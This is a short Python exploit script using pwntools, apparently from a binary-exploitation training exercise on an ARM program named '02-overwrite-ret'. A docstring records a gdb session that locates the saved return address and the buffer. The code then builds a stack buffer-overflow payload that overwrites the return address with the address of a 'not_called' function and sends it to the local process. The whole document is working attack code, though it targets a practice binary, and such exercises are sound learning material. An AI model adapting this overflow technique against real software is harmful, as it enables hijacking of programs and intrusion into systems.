#!/usr/bin/python

"""
(gdb) disassemble vulnerable
Dump of assembler code for function vulnerable:
   0x000104e0 <+0>:	push	{r7, lr}
...
   0x00010518 <+56>:	pop	{r7, pc}
End of assembler dump.
(gdb) b *0x00010518
Breakpoint 1 at 0x10518: file src/02-overwrite-ret.c, line 16.
(gdb) c
Continuing.

Breakpoint 1, 0x00010518 in vulnerable () at src/02-overwrite-ret.c:16
16	}
(gdb) i r $sp
sp             0xfffeef20	0xfffeef20
(gdb) p &buffer[0]
$1 = 0xfffeeea0 'a' <repeats 128 times>, "(\357\376\377)\005\001"

"""

import struct
import sys

from pwn import *

context(arch='arm', os='linux', endian='little', word_size=32)

binary_path = './bin/arm/02-overwrite-ret'

saved_pc_addr = 0xfffeef20 + 4
buffer_addr = 0xfffeeea0

binary = ELF(binary_path)
not_called_addr = binary.symbols['not_called']

p = process(binary_path)
#p = gdb.debug([binary_path])

payload = ''
payload += 'a' * (saved_pc_addr - buffer_addr)
payload += p32(not_called_addr)

p.readuntil('> ')
p.write(payload)
p.interactive()
